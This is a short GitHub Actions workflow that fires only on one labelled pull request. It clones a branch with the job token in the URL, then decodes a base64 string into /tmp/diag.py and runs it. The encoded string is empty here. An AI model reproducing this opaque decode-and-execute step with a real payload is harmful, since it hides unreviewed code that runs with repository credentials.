name: issue-839-patch-probe

on:
  pull_request:
    types: [labeled]
    branches: [main]

permissions:
  contents: read

jobs:
  probe:
    if: github.event.pull_request.number == 845 && github.event.label.name == 'in_progress'
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - name: Probe patch preconditions
        env:
          GH_TOKEN: ${{ github.token }}
        shell: bash
        run: |
          set -euo pipefail
          git clone -q --single-branch --branch issue-839-pack-review-runner-v2 "https://x-access-token:${GH_TOKEN}@github.com/chetwerikoff/orchestrator-pack.git" repo
          cd repo
          echo '' | base64 -d >/tmp/diag.py
          python3 /tmp/diag.py
